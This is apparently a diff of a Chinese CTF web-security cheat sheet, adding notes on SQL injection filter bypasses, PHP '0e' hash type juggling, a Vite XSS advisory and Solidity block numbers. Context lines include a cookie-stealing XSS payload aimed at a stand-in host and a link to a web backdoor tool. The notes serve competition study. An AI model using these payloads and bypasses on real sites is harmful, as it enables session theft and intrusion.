@@ -516,7 +516,7 @@ Content-Disposition: form-data; name="submit"
 51. [koa框架结构](https://www.cnblogs.com/wangjiahui/p/12660093.html)。
 52. 无列名注入+布尔盲注。例题:[[GYCTF2020]Ezsqli](https://blog.csdn.net/qq_45521281/article/details/106647880)(里面最后一道例题)
 53. sql多行二次注入+git目录泄漏+.DS_Store泄露。例题:[comment](../../CTF/攻防世界/7级/Web/comment.md)
-54. sql注入中，空格能用内联注释符`/**/`代替；如果注释符`#`被过滤，可以用`;%00`替代，截断注释后面的内容。
+54. sql注入中，空格能用内联注释符`/**/`或tab键代替；如果注释符`#`被过滤，可以用`;%00`替代，截断注释后面的内容。
 55. regexp盲注。例题:[[NCTF2019]SQLi](https://blog.csdn.net/l2872253606/article/details/125265138)
 56. [Arjun](https://github.com/s0md3v/Arjun) http参数爆破工具。
 57. 使用php://filter/string.strip_tags导致php崩溃清空堆栈重启，如果在同时上传了一个木马，那么这个tmp file就会一直留在tmp目录，再进行文件名爆破并连接木马就可以getshell。来自[php文件操作trick](https://www.cnblogs.com/tr1ple/p/11301743.html)。更多参考[PHP临时文件机制](https://www.cnblogs.com/linuxsec/articles/11278477.html)。例题:[[NPUCTF2020]ezinclude](https://www.cnblogs.com/Article-kelp/p/14826360.html)
@@ -2789,7 +2789,7 @@ SuperSerial不处理函数，所以没法像python的pickle那样直接RCE。
 ```
 若`example.com`返回错误（比如404），就会访问`attacker.com`
 - xs leak题目的特征也是有admin bot，且会提供搜索功能。可以拿题目的csp来[网站](https://csp-evaluator.withgoogle.com/)看一眼，缺什么csp就考虑什么样的攻击手段
-281. php类型混淆（type juggling）。`"anystring"==0`成立。更多参考 https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf
+281. php类型混淆（type juggling）。`"anystring"==0`成立，不同的hash值只需前两个字符都为0e且后续字符只有数字即可被判定为相等。更多参考 https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf 和 https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Type%20Juggling
 282. [Login](https://github.com/ImaginaryCTF/ImaginaryCTF-2023-Challenges/tree/main/Web/login),[wp](https://f0rk3b0mb.github.io/p/imaginaryctf2023/#login)
 - 如果sql查询语句有注入漏洞，即使使用php的password_verify也无法阻止这点。参考 https://stackoverflow.com/questions/50756182/sql-injection-with-password-verify
 ```php
@@ -3328,3 +3328,7 @@ window.recaptcha=true;
 - `https://www.google.com/amp/`后跟任意支持amp的网站即可实现重定向。另一种利用google重定向的方法参考 https://isc.sans.edu/diary/How+Malware+Campaigns+Employ+Google+Redirects+and+Analytics/19843 。后一种做法需要获取某个网站的usg内容，但是这个东西没法算，可以利用邮件让google生成后抄下来。其他参考链接： https://news.sophos.com/en-us/2020/05/15/how-scammers-abuse-google-searchs-open-redirect-feature/ ， https://github.com/aszx87410/blog/issues/87 ， https://vicevirus.github.io/posts/report-google-wgmy-2023/
 - 无括号xss payload：`<svg/onload=location=/\test.com/+document.cookie>`
 387. [tsh-go](https://github.com/CykuTW/tsh-go):go语言写的小型网站后门
+388. [Armoured-notes](https://github.com/Pratham1812/ctf-writeups/tree/master/BackdoorCTF2023/armoured-notes)
+- nodejs vite transformIndexHtml xss[漏洞](https://github.com/vitejs/vite/security/advisories/GHSA-92r3-m2mg-pj97?cve=title)。transformIndexHtml的使用方法为`transformIndexHtml(url,template)`，其中url为请求时的url。若该url未做过滤，攻击者可直接在该页面上获取xss（无关渲染的template）
+389. [BabyBlackJack](https://github.com/n0kto/ctf-writeups/tree/main/BackdoorCTF/BabyBlackJack)
+- solidity有关`block.number`的知识：one block contains one transaction which can contain multiple call (with all the same block number)
